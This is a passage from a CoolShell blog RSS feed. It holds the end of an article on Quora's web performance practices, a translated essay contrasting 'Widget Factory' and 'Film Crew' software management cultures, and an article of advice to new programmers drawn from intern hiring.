<span class="ez-toc-section" id="Git"></span>Git<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://git-scm.com/">Git</a> <a href="https://www.quora.com/What-languages-and-frameworks-were-used-to-code-Quora">是他们的源码版本控制工具</a>.</p>
<h4 id="javascript-placement">
<span class="ez-toc-section" id="JavaScript_Placement"></span>JavaScript Placement<span class="ez-toc-section-end"></span>
</h4>
<p>如果你看一下Quora的网页源码，你会看到其JavaScript总是在页面的最后。 Charlie Cheever<a href="https://www.quora.com/Why-is-the-Quora-website-so-fast">建议</a> 这会让你的页面显得载入得很快，因为其先显示内容，然后在载入Javascript。</p>
<h4 id="charlie-cheever-follows-14-rules-for-faster-loading-web-sites">
<span class="ez-toc-section" id="Charlie_Cheever_%E9%81%B5%E4%BB%8E_14_Rules_for_Faster-Loading_Web_Sites"></span>Charlie Cheever 遵从 “14 Rules for Faster-Loading Web Sites”<span class="ez-toc-section-end"></span>
</h4>
<p>Steve Souders,  High Performance Web Sites 和 Even Faster Web Sites的作者，其列了一些 <a href="http://stevesouders.com/hpws/rules.php">rules让你网页更快的原则</a>。 Charlie Cheever 的 Quora 创始人提到这些过，这应该也是Quora的速度的原因。</p>
<blockquote><p>“One resource we used as a guide is Steve Souders’ list of rules for high performance websites:<a href="http://stevesouders.com/hpws/rules.php">http://stevesouders.com/hpws/rules.php</a>”<br>
<small><a href="https://www.quora.com/Why-is-the-Quora-website-so-fast">– Charlie Cheever, Quora</a></small></p></blockquote>
<div>
<div>Steve Souders的14条规则是——<a href="https://www.amazon.com/gp/product/0596529309?ie=UTF8&amp;tag=getafil-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0596529309"><img alt="image placeholder" ></a><a href="https://www.amazon.com/gp/product/0596522304?ie=UTF8&amp;tag=getafil-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0596522304"><br>
</a> 
<ul>
<li>Make Fewer HTTP Requests</li>
<li>Use a Content Delivery Network</li>
<li>Add an Expires Header</li>
<li>Gzip Components</li>
<li>Put Stylesheets at the Top</li>
<li>Put Scripts at the Bottom</li>
<li>
<a href="https://www.amazon.com/gp/product/0596522304?ie=UTF8&amp;tag=getafil-20&amp;linkCode=as2&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0596522304"><img alt="image placeholder" ></a>Avoid CSS Expressions</li>
<li>Make JavaScript and CSS External</li>
<li>Reduce DNS Lookups</li>
<li>Minify JavaScript</li>
<li>Avoid Redirects</li>
<li>Remove Duplicate Scripts</li>
<li>Configure ETags</li>
<li>Make AJAX Cacheable</li>
</ul>
</div>
</div>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4549.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4549.html" class="wp_rp_title">Facebook 的系统架构</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18140.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18140.html" class="wp_rp_title">关于Facebook 的 React 专利许可证</a>
</li>
<li>
<a href="https://coolshell.cn/articles/11265.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/11265.html" class="wp_rp_title">Python修饰器的函数式编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10822.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10822.html" class="wp_rp_title">函数式编程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10169.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10169.html" class="wp_rp_title">类型的本质和函数式实现</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4939" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="03370f6395">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>12</strong> 人打了分，平均分： <strong>4.33</strong> )<br><span class="post-ratings-text" id="ratings_4939_text"></span><meta itemprop="name" content="Quora使用到的技术">
<meta itemprop="headline" content="Quora使用到的技术">
<meta itemprop="description" content="以前向大家介绍过Stack Exchange的系统架构和Facebook的系统架构，今天和大家说说Quora的。本文主要参考了Phil Whelan的这篇文章《Quora's Technology Examined》。关于Quora是个什么网站我就不多说了，国内对他的C2C网站叫“知乎”。呵呵。我们还是来看看Quora的技术吧。
Search-Box
Quora只能搜索问题，主题标签，用户名，...">
<meta itemprop="datePublished" content="2011-07-04T08:35:37+08:00">
<meta itemprop="dateModified" content="2011-07-04T11:45:25+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4939.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4939.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.33">
<meta itemprop="ratingCount" content="12">
</div>
</div>
<div id="post-ratings-4939-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-07-04T08:35:37+08:00</pubDate>
<guid>https://coolshell.cn/articles/4939.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 软件公司的两种管理方式 ]]></title>
<link>https://coolshell.cn/articles/4951.html</link>
<content><![CDATA[ 
<p>这篇文章是我的一个外国的同事Gareth推荐给我的，我和他一起工作过一段时间。他之所以觉得非常不错，是因为这篇文章让他身有体会，他觉得我也一定会有体会，并让我考虑一下翻译到我的blog上来。我看完后觉得很有代表性，而且觉得说得太对了，所以翻译过来，<strong>希望大家都读一读，最好转给你的公司老板</strong>。</p>
<p>这篇文章来源于 StakeExchange上的一个问题——“<a title="Why do business analysts and project managers get higher salaries than programmers?" href="https://programmers.stackexchange.com/questions/45776/why-do-business-analysts-and-project-managers-get-higher-salaries-than-programmer" target="_blank">为什么BA和PM的薪水要比程序员要高？</a>”，顶在一楼的回复分析了这个原因，并指出了两种管理文化。</p>
<p style="text-align: center;">———————————————————正文开始————————————————————</p>
<p>一个简单的回答应该是——“因为在我们的社会里，我们总是会认为薪水和会和职位的层次绑在一起”。但是，这个答案同时也折射出一个事实——我们的薪资是基于我们的所理解的价值，但这并没有解释</p>
<ol>
<li><strong>为什么PM（Project Manager）和BA（Business Analysts）在很多软件公司里在组织的上层？</strong></li>
<li><strong>为什么软件项目团队总是在最底层？</strong></li>
</ol>
<p>这两个问题真是非常地值得我们去问，去思考。</p>
<p>总体来说，这个世界上存在两种不同的软件公司的组织结构。我把他们叫做 <strong>Widget Factory</strong>（小商品工厂） 和 <strong>Film Crews</strong>（电影工作组）.</p>
<p>Widget Factories 想要去解决 <a href="https://en.wikipedia.org/wiki/Theory_X_and_theory_Y" rel="nofollow">怎么去激发被X理论所影响的人</a> 。X理论由 McGregor提出，这个理论是说，一般人的本性是懒惰的，工作越少越好，可能的话会逃避工作，大部分人对集体（公司，机构，单位或组织等）的目标不关心，因此管理者需要以强迫，威胁处罚，指导，金钱利益等诱因激发人们的工作源动力。于是，经理总是要去做他下属的工作。于是，基于这种前提下所思考出来的管理方式，很自然的就是——整个团队能够容易地被经理一个人所取代，这种团队中的每一个人都很容易被别人取代，在这种团队里，经理的工作能力不断地被加强。因些，这种公司一般使用树形层级的组织结构，而不是水平式的工作角色。</p>
<p><span id="more-4951"></span></p>
<p>Widget Factory 管理体系运作于软件需求的某种假设，这种假设需要BA在一个定义地非常明确的并且需要主管项目经理监管的流程的环境下，准备软件的规格说明书。这种软件制造业需要对项目定置足够的可被替换的编程和测试资源。整个工作由事先安排好的预算来驱动，这个预算由PM和BA在初始化business case的时候完成。</p>
<p>一个 Widget Factory 的公司的管理可以通过观察这个公司员工的谈话方式识别出来。他们很喜欢谈论Resource资源（包括干活的人也叫做resource），Process流程，Operating efficiency运作效率，uniformity一致性， repeatability可重复性，严格在控制对资源的使用，鲜明的工作角色和 鲜明的流程定义（inputs 和 outputs）。他们对实实在在的软件开发漠不关心，他们想要把理想中的软件开发运作变成他们看得见的图画。</p>
<p>Film Crews 。这种公司认为人是有相当高的智力和创造力的，是自己可以激发自己的（陈皓注：即使没有外界的压力和处罚的威胁，他们一样会努力工作以期达到目的——人们具有自我调节和自我监督的能力），人们努力工作，并且可以享受工作（人们愿意为集体的目标而努力，在工作上会尽最大的努力，以发挥创造力，才智），就像孩子喜欢玩一样。 Film Crews 认为，每一个个体的自已专业能力，要远远优于那种被组织和协调出来的能力。因为经理不再代替每一个人，而树形的层次架构也不能很好的运作——人们不得不以比较复杂和形式合作才能把事搞定。工作职责变得非常地垂直——你需要具有从上到下的而比较宽泛的各种能力（陈皓注：每个人都需要有管理和技术能力），这种管理也就是基于 <a href="https://en.wikipedia.org/wiki/Theory_X_and_theory_Y" rel="nofollow">McGregor的 Y理论</a>。</p>
<p>对于一个Film Crew 的Director（注：有总监和导演的意思），他了解把一个伟大的软件组合起来的每一个碎片，他需要组织一个无与伦比的团队，并且要帮助这个团队能凝聚在一起，团结在一起工作。他的角色是鼓舞大家，守护着构想（Vision），提供方向和集中大家的精力。团队里的每一个人都很关键，因为“Director”相信软件的结果来自所有的参与者，以及他们的那种独一无二团队工作方式。大家都知道自己是这个事的一个明星，明星效应可以增加成每个人的成功的机会。而他们的构想(Vision)驱动着项目的预算和拨款。</p>
<p><strong>当我们用报酬来表示的话，</strong> Widget Factories 认为，有价值的东西总是从PM和BA派生出来的，所以他们常驻在管理层的上面，也有相应的报酬，而对于软件团队，只要他们正确地把需求变成可工作的代码后，软件团队就变得无所谓了。PM 和 BA 努力工作来维护他们的权位，他们通常不会让你能得到项目的原始信息。因为团队拿不到项目的原始信息，所以团队就要拼命地制造各种理由来让他们的方案变得有价值，程序员成为了只会从PM和BA那边听从命令的工人。而这种情况反而让Widget Factory 公司放大了他们的那种想法——程序员都是差不多的，就像车间里的工人一样，他们只不过在机械地干一些很复杂的但是很标准的事情。</p>
<p>与 Widget Factories 公司鲜明的对比，Film Crew 更主张的是平等的工作职能，每个成员都可以不受限制地获得主要的和原始的信息，其鼓励所有人形成自己的价值判断，并且可以自由地选择不同的方式来达到团队的构想。Leadership领导力结构基于人的能力而不是工作角色。报酬折射出这个人是怎么在这个项目中工作的，需要明白这个人为我们的软件创造了多大的价值和产生了怎么样的结果。 在这种环境里，PM的工作显得并不突出，他也许也不太可能是一个有创造力的领导者，工作角色被弱化成了一种行政管理上的支持者，以及团队外部的联系者。BA的部分工作直接被团队取代（在项目早期被Director取代）。</p>
<p>今天，我们一点也不奇怪，大多数的公司内的软件开发团队以及一些咨询工作运作于 Widget Factories ，其需要依赖于流程来不断地制造那些无聊的软件。在这种情况，惯例上来说，PM和BA要比程序员挣得更多，这是基本一种他们可以创造更多价值的假设。<strong>在这种组强架构和管理里，程序员们很难证明管理是错误的。</strong></p>
<p><strong>成功的软件公司都会趋于采用 Film Crew 的方式，任何其它的东西都会妨碍他们吸引牛人的能力，因为只有吸引了牛人，你才能创造出伟大的软件</strong>。 在这种公司里，一个好的程序员的收入会高过BA和PM很多。</p>
<p style="text-align: center;">———————————————————正文结束————————————————————</p>
<p style="text-align: left;">读完这个贴子，我发现这完全就是在说我上一家公司和现在公司。我上一家公司的经理们最喜欢谈论的就是resource、 process，而他们的Project Manager或Team Manager或Dev Manager几乎不会为软件团队分担真正的软件开发的压力，还不如Widget Factory。哎！第一次看到这么被人系统地表达出来，心中的一些困惑都得到了解答。</p>
<p style="text-align: left;">你的公司属于哪一种呢？</p>
<p style="text-align: left;"><em><strong>————更新 – 2011-7-6 晚————</strong></em></p>
<p style="text-align: left;">有人在我的新浪微博（<a href="https://weibo.com/haoel" target="_blank">@左耳朵耗子</a>）里说，Widget Factory就是Waterfall，Film Crews就是Agile，在下面的留言里也说Film Crews很像SCRUM。我在这里驳斥一下这种说法：</p>
<ol>
<li>我上一家公司也用Agile ，但本质上还是Widget Factory，甚至还不像。</li>
<li>著名的Thoughtworks中国公司，Agile的倡导者，其实是外包公司，他们的开发团队中也有PM和BA。</li>
</ol>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/10217.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10217.html" class="wp_rp_title">加班与效率</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3218.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3218.html" class="wp_rp_title">开发时间估计</a>
</li>
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4951" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="191a84a1b7">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>51</strong> 人打了分，平均分： <strong>4.69</strong> )<br><span class="post-ratings-text" id="ratings_4951_text"></span><meta itemprop="name" content="软件公司的两种管理方式">
<meta itemprop="headline" content="软件公司的两种管理方式">
<meta itemprop="description" content="这篇文章是我的一个外国的同事Gareth推荐给我的，我和他一起工作过一段时间。他之所以觉得非常不错，是因为这篇文章让他身有体会，他觉得我也一定会有体会，并让我考虑一下翻译到我的blog上来。我看完后觉得很有代表性，而且觉得说得太对了，所以翻译过来，希望大家都读一读，最好转给你的公司老板。

这篇文章来源于 StakeExchange上的一个问题——“为什么BA和PM的薪水要比程序员要高？”，顶...">
<meta itemprop="datePublished" content="2011-07-06T08:36:43+08:00">
<meta itemprop="dateModified" content="2011-07-07T15:32:37+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4951.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4951.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.69">
<meta itemprop="ratingCount" content="51">
</div>
</div>
<div id="post-ratings-4951-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-07-06T08:36:43+08:00</pubDate>
<guid>https://coolshell.cn/articles/4951.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 给程序员新手的一些建议 ]]></title>
<link>https://coolshell.cn/articles/4976.html</link>
<content><![CDATA[ 
<p>前段时间因为实习生计划花了很多时间做了实习生招聘的工作，产生的一些想法，写在这里。</p>
<p>这次招聘过程中，我发现我们在校的学生有下面的这些特点：</p>
<p><strong>1）NB的项目。</strong>当说到自己做过的项目时， 我发现他们做的事都是很NB。要么是研究Linux的底层内核，要么是图像识别处理，要么是推荐算法，要么做高性能计算，要么做数据挖掘，要么是移动方面的协议，还有一些很高深的课题我听不太懂的项目。这让我想起当年我在学校里的实习，对比起我用Java Applet 和 HTML做操作系统的教学课件，或是在公司里用Delphi/PowerBuilder做的那些MIS系统。让我觉得有些汗颜。</p>
<p><strong>2）OK的解决问题能力。</strong>当问到算法题时，我发现他们的问题解决能力还OK。我一般问1到2个中低难度的算法题和1个基本的面向对象设计的题，都不难。我相信只要在学校里好好学习的人都应该答得出来。无非就是一些基本的算法和基本数据结构操作的问题，和比较基础的面向对象设计的题，说白了就是作业题。可惜的是，只有5%不到的同学能够在不给提示的情况下答出来，70%的人可以在给一定的提示下答出来，15%左右的同学需要提示到几乎给出答案才能答出来，还有10%的同学怎么给提示都答不出来。</p>
<p><strong>3）WTF的编码能力</strong>。老实说，对于解算法题，我还是比较可以接受的，因为80%左右的同学在给予提示后都能描述出解题的算法，于是，我让他们把这个算法用他们最熟悉的语言写出来。但结果让我出乎意料，一段在解法很清楚的情况下只需要不到30行代码的小算法题，只有一个人能在10分钟几写完，其它的人基本所有的需要30分钟左右（甚至40分钟），有2、3个人居然写不出来。有一个比较极端的case是——有个同学花了十分钟都写不出从一个整型数组中找到最小的正数的代码。这个事让我觉得很惊讶，难道大家在做项目的时候不编程吗？</p>
<p>对于这种情况，我想给大家以下后一些建议：</p>
<p><span id="more-4976"></span></p>
<ul>
<li>我感到我们在校的学生正如“<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">为什么中国的网页这么烂</a>”中所说的——<strong>他们习惯于获取大量的知识，而从不对这些知识进行思考和总结</strong>。问题不是我们知道多少东西，问题是我们在获取这些知识的时候会不会去思考这些知识后的东西？比如：为什么会有这么多经典的数据结构，数组，链表，树，哈希表，图这些数据结构主要用来解决什么样的问题，他们的优势和劣势是什么？<strong>没有思考过，就不算真正的懂，没有思考过，你将无法应对万变的问题，没有思考过，你将成为书呆子</strong>。</li>
</ul>
<ul>
<li>
<strong>多多实践而不是研究</strong>。编程不是在实验室做科研搞理论啊，计算机这本就是一个实践性很强的的学科啊，这不是数学，这需要你多多的实践啊。我们不要真以为读的是——计算机科学（Computer Science ）就是搞理论的了，这里面需要很多很多的Engineering的工作。（我实在是很难想像，居然有这么多人写一般难度的程序居然会是那么痛苦的事）</li>
</ul>
<ul>
<li>我在我的新浪微博（<a href="https://weibo.com/haoel" target="_blank">@左耳朵耗子</a>）里说的，我们不要以为做过项目，会写程序，我们就是程序员了。如果你只是在按部就班地写代码，你就是Coder，江湖叫“码农”，不要把自己当成“码农”，我们一定要对自己的代码，自己的设计不停地反思和总结，并精益求精，写程序本来就是一件有价值的事，这就像写篇作文人人都会写，但并不是人人都能把文章写好。<strong>编程和写作都是一样的，这都是在搞创作啊。想做“码农”还是想做“程序员”？自己决定吧</strong>。</li>
</ul>
<ul>
<li>
<strong>我们的教育的确很“废柴”，但这不是我们成为“废柴”的原因</strong>。如果我们的学习还停留在“别人给我什么我就学什么”的被动学习阶段，那么你真的不懂怎么是学习。虽然，我们的学校里并没有教你什么是“Version Control”，什么是“Coding Style”，什么是“Refactory”，什么是“Code Review”，什么是“Unit Test”，也没有告诉你一些经典的设计的和架构，等等，等等，但是这是什么年代了？这个时代不是像我上学那时——学校机房里上机用的电脑连内存和硬盘都没有，用5寸的低密软盘面对绿色显示器的286，上网还要“猫”，而且贵的要死（一小时22元），而且网上什么都没有时代了。<strong>我们身边有很多很多优秀的人，网上有很多优秀的文章，书店里也有很多不错的书，而且我们的软件开发日趋成熟，如果我们还学不好的话，那么我们就是在犯罪！</strong>
</li>
</ul>
<p>最后，和大家说一下公司的实习生招聘。这个事情其实是毕业生招聘的一个组成部分，也就是说，因为我国教育的问题，再加上学生自己的问题，导致毕业生量多质次的情况很严重，对于公司，其很难从学校招到一个比较不错的毕业生，这种情况已经不是新问题了，所以，也有很多公司都不招刚毕业的学生。因此，通过实习机会了解并招聘毕业生成了很多公司的毕业生招聘的手段。所以，在这里想告诉在校的同学们，千万不要以为实习计划就是字面上的实习。其实，这和正式的招聘没有什么差别，同样也要看你的能力的。</p>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8138.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_title">为什么我反对纯算法面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4506.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4506.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（上）</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4490.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4490.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（下）</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3345.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3345.html" class="wp_rp_title">140个Google的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1870.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1870.html" class="wp_rp_title">我是怎么招聘程序员的</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4976" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="3a97f64a68">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>58</strong> 人打了分，平均分： <strong>4.59</strong> )<br><span class="post-ratings-text" id="ratings_4976_text"></span><meta itemprop="name" content="给程序员新手的一些建议">
<meta itemprop="headline" content="给程序员新手的一些建议">
<meta itemprop="description" content="前段时间因为实习生计划花了很多时间做了实习生招聘的工作，产生的一些想法，写在这里。

这次招聘过程中，我发现我们在校的学生有下面的这些特点：

1）NB的项目。当说到自己做过的项目时， 我发现他们做的事都是很NB。要么是研究Linux的底层内核，要么是图像识别处理，要么是推荐算法，要么做高性能计算，要么做数据挖掘，要么是移动方面的协议，还有一些很高深的课题我听不太懂的项目。这让我想起当年我...">
<meta itemprop="datePublished" content="2011-07-12T08:37:49+08:00">
<meta itemprop="dateModified" content="2011-07-12T12:07:04+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4976.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4976.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.59">
<meta itemprop="ratingCount" content="58">
</div>
</div>
<div id="post-ratings-4976-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-07-12T08:37:49+08:00</pubDate>
<guid>https://coolshell.cn/articles/4976.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
</channel>
</rss>
